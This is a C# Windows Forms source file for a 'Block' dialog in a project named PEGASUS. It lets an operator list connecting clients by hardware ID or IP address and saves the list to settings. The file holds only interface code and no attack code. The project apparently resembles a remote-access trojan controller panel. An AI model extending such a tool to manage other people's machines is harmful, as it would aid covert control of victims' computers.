using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using PEGASUS.Properties;

namespace PEGASUS.Forms
{

	public class FormBlockClients : Form
	{
		private IContainer components;

		private ListBox listBlocked;

		private Label label1;

		private Guna2PictureBox guna2PictureBox1;

		private Guna2TextBox txtBlock;

		private Guna2GradientButton btnDelete;

		private Guna2GradientButton btnAdd;

		private Guna2Separator guna2Separator1;

		public FormBlockClients()
		{
			InitializeComponent();
		}

		private void BtnAdd_Click(object sender, EventArgs e)
		{
			try
			{
				listBlocked.Items.Add(txtBlock.Text);
				txtBlock.Clear();
			}
			catch
			{
			}
		}

		private void BtnDelete_Click(object sender, EventArgs e)
		{
			try
			{
				for (int num = listBlocked.SelectedIndices.Count - 1; num >= 0; num--)
				{
					listBlocked.Items.RemoveAt(listBlocked.SelectedIndices[num]);
				}
			}
			catch
			{
			}
		}

		private void FormBlockClients_Load(object sender, EventArgs e)
		{
			try
			{
				listBlocked.Items.Clear();
				if (string.IsNullOrWhiteSpace(PEGASUS.Properties.Settings.Default.txtBlocked))
				{
					return;
				}
				string[] array = PEGASUS.Properties.Settings.Default.txtBlocked.Split(',');
				foreach (string text in array)
				{
					if (!string.IsNullOrWhiteSpace(text))
					{
						listBlocked.Items.Add(text);
					}
				}
			}
			catch
			{
			}
		}

		private void FormBlockClients_FormClosed(object sender, FormClosedEventArgs e)
		{
			try
			{
				lock (Settings.Blocked)
				{
					Settings.Blocked.Clear();
					List<string> list = new List<string>();
					foreach (string item in listBlocked.Items)
					{
						list.Add(item);
						Settings.Blocked.Add(item);
					}
					PEGASUS.Properties.Settings.Default.txtBlocked = string.Join(",", list);
					PEGASUS.Properties.Settings.Default.Save();
				}
			}
			catch
			{
			}
		}

		private void guna2PictureBox1_Click(object sender, EventArgs e)
		{
			Close();
		}

		[DllImport("user32.DLL")]
		private static extern void ReleaseCapture();

		[DllImport("user32.DLL")]
		private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

		private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
		{
			ReleaseCapture();
			SendMessage(base.Handle, 274, 61458, 0);
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormBlockClients));
			listBlocked = new System.Windows.Forms.ListBox();
			label1 = new System.Windows.Forms.Label();
			guna2PictureBox1 = new Guna.UI2.WinForms.Guna2PictureBox();
			txtBlock = new Guna.UI2.WinForms.Guna2TextBox();
			btnDelete = new Guna.UI2.WinForms.Guna2GradientButton();
			btnAdd = new Guna.UI2.WinForms.Guna2GradientButton();
			guna2Separator1 = new Guna.UI2.WinForms.Guna2Separator();
			((System.ComponentModel.ISupportInitialize)guna2PictureBox1).BeginInit();
			SuspendLayout();
			listBlocked.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
			listBlocked.BorderStyle = System.Windows.Forms.BorderStyle.None;
			listBlocked.DataBindings.Add(new System.Windows.Forms.Binding("Name", PEGASUS.Properties.Settings.Default, "txtBlocked", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
			listBlocked.ForeColor = System.Drawing.Color.LightGray;
			listBlocked.FormattingEnabled = true;
			listBlocked.Location = new System.Drawing.Point(287, 84);
			listBlocked.Margin = new System.Windows.Forms.Padding(2);
			listBlocked.Name = PEGASUS.Properties.Settings.Default.txtBlocked;
			listBlocked.SelectionMode = System.Windows.Forms.SelectionMode.MultiSimple;
			listBlocked.Size = new System.Drawing.Size(297, 169);
			listBlocked.TabIndex = 4;
			label1.AutoSize = true;
			label1.Location = new System.Drawing.Point(35, 117);
			label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
			label1.Name = "label1";
			label1.Size = new System.Drawing.Size(89, 13);
			label1.TabIndex = 1;
			label1.Text = "Input HWID or IP";
			guna2PictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2PictureBox1.BackColor = System.Drawing.Color.Transparent;
			guna2PictureBox1.Image = (System.Drawing.Image)resources.GetObject("guna2PictureBox1.Image");
			guna2PictureBox1.ImageRotate = 0f;
			guna2PictureBox1.Location = new System.Drawing.Point(590, 12);
			guna2PictureBox1.Name = "guna2PictureBox1";
			guna2PictureBox1.ShadowDecoration.Parent = guna2PictureBox1;
			guna2PictureBox1.Size = new System.Drawing.Size(29, 27);
			guna2PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			guna2PictureBox1.TabIndex = 7;
			guna2PictureBox1.TabStop = false;
			guna2PictureBox1.UseTransparentBackground = true;
			guna2PictureBox1.Click += new System.EventHandler(guna2PictureBox1_Click);
			txtBlock.Animated = true;
			txtBlock.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			txtBlock.Cursor = System.Windows.Forms.Cursors.IBeam;
			txtBlock.DefaultText = "";
			txtBlock.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			txtBlock.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			txtBlock.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			txtBlock.DisabledState.Parent = txtBlock;
			txtBlock.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			txtBlock.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			txtBlock.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
			txtBlock.FocusedState.Parent = txtBlock;
			txtBlock.Font = new System.Drawing.Font("Electrolize", 9f);
			txtBlock.ForeColor = System.Drawing.Color.White;
			txtBlock.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
			txtBlock.HoverState.Parent = txtBlock;
			txtBlock.Location = new System.Drawing.Point(38, 133);
			txtBlock.Name = "txtBlock";
			txtBlock.PasswordChar = '\0';
			txtBlock.PlaceholderText = "";
			txtBlock.SelectedText = "";
			txtBlock.ShadowDecoration.Parent = txtBlock;
			txtBlock.Size = new System.Drawing.Size(244, 20);
			txtBlock.TabIndex = 8;
			btnDelete.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			btnDelete.BorderThickness = 1;
			btnDelete.CheckedState.Parent = btnDelete;
			btnDelete.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnDelete.CustomImages.Parent = btnDelete;
			btnDelete.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			btnDelete.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			btnDelete.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			btnDelete.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			btnDelete.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			btnDelete.DisabledState.Parent = btnDelete;
			btnDelete.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnDelete.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
			btnDelete.Font = new System.Drawing.Font("Electrolize", 9f);
			btnDelete.ForeColor = System.Drawing.Color.White;
			btnDelete.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnDelete.HoverState.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnDelete.HoverState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			btnDelete.HoverState.ForeColor = System.Drawing.Color.LightGray;
			btnDelete.HoverState.Parent = btnDelete;
			btnDelete.Location = new System.Drawing.Point(38, 159);
			btnDelete.Name = "btnDelete";
			btnDelete.ShadowDecoration.Parent = btnDelete;
			btnDelete.Size = new System.Drawing.Size(244, 30);
			btnDelete.TabIndex = 9;
			btnDelete.Text = "Delete";
			btnDelete.Click += new System.EventHandler(BtnDelete_Click);
			btnAdd.BorderColor = System.Drawing.Color.FromArgb(42, 42, 42);
			btnAdd.BorderThickness = 1;
			btnAdd.CheckedState.Parent = btnAdd;
			btnAdd.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnAdd.CustomImages.Parent = btnAdd;
			btnAdd.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
			btnAdd.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			btnAdd.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
			btnAdd.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			btnAdd.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
			btnAdd.DisabledState.Parent = btnAdd;
			btnAdd.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			btnAdd.FillColor2 = System.Drawing.Color.FromArgb(36, 36, 36);
			btnAdd.Font = new System.Drawing.Font("Electrolize", 9f);
			btnAdd.ForeColor = System.Drawing.Color.White;
			btnAdd.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnAdd.HoverState.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			btnAdd.HoverState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			btnAdd.HoverState.ForeColor = System.Drawing.Color.LightGray;
			btnAdd.HoverState.Parent = btnAdd;
			btnAdd.Location = new System.Drawing.Point(38, 195);
			btnAdd.Name = "btnAdd";
			btnAdd.ShadowDecoration.Parent = btnAdd;
			btnAdd.Size = new System.Drawing.Size(244, 30);
			btnAdd.TabIndex = 10;
			btnAdd.Text = "Add";
			btnAdd.Click += new System.EventHandler(BtnAdd_Click);
			guna2Separator1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			guna2Separator1.BackColor = System.Drawing.Color.Transparent;
			guna2Separator1.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
			guna2Separator1.Location = new System.Drawing.Point(-334, 60);
			guna2Separator1.Name = "guna2Separator1";
			guna2Separator1.Size = new System.Drawing.Size(1299, 10);
			guna2Separator1.TabIndex = 11;
			guna2Separator1.UseTransparentBackground = true;
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			base.ClientSize = new System.Drawing.Size(631, 299);
			base.Controls.Add(guna2Separator1);
			base.Controls.Add(btnAdd);
			base.Controls.Add(btnDelete);
			base.Controls.Add(txtBlock);
			base.Controls.Add(label1);
			base.Controls.Add(listBlocked);
			base.Controls.Add(guna2PictureBox1);
			ForeColor = System.Drawing.Color.LightGray;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Margin = new System.Windows.Forms.Padding(2);
			base.Name = "FormBlockClients";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterParent;
			Text = "Block";
			base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(FormBlockClients_FormClosed);
			base.Load += new System.EventHandler(FormBlockClients_Load);
			base.MouseDown += new System.Windows.Forms.MouseEventHandler(guna2Panel1_MouseDown);
			((System.ComponentModel.ISupportInitialize)guna2PictureBox1).EndInit();
			ResumeLayout(false);
			PerformLayout();
		}
	}
}
